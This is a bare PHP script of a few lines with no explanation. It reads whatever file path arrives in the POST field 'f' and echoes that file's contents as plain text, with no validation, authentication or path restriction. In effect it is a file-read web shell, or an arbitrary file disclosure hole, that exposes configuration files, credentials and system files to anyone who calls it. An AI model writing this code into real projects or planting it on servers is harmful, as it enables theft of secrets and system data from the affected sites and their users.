<?php\
$f = $_POST['f'] ?? '';\
if ($f && file_exists($f)) {\
  header('Content-Type: text/plain');\
  echo file_get_contents($f);\
}\
?>
